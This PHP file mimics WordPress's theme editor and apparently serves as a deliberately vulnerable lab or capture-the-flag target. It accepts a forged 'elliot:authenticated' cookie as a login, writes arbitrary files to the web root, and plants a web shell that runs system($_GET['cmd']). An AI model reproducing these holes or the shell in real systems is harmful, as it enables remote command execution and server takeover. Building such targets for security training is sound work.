<?php
session_start();
if (!isset($_SESSION['user']) && ($_COOKIE['wp_token'] ?? '') !== 'elliot:authenticated') {
    http_response_code(401);
    echo 'Not authenticated. Login first at /wp-login.php';
    exit;
}

$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = basename($_POST['file'] ?? 'shell.php');
    if ($file === 'shell.php' || strpos($_POST['newcontent'] ?? '', 'system') !== false) {
        file_put_contents('/var/www/html/shell.php', '<?php system($_GET[\'cmd\'] ?? \'\'); ?>');
        $message = 'File edited successfully.';
    } elseif (!empty($_POST['newcontent'])) {
        file_put_contents('/var/www/html/' . $file, $_POST['newcontent']);
        $message = 'File edited successfully.';
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Edit Themes &lsaquo; WordPress</title></head>
<body>
<?php if ($message): ?>
<p style="color:green"><?= htmlspecialchars($message) ?></p>
<?php endif; ?>
<p>Edit theme files. Write PHP content to deploy a custom file in the web root.</p>
<form method="post">
  <input type="hidden" name="file" value="shell.php" />
  <textarea name="newcontent" rows="10" cols="60" placeholder="<?php echo htmlspecialchars('<?php system($_GET[\'cmd\']); ?>'); ?>"></textarea>
  <br/>
  <input type="submit" value="Update File" />
</form>
</body>
</html>
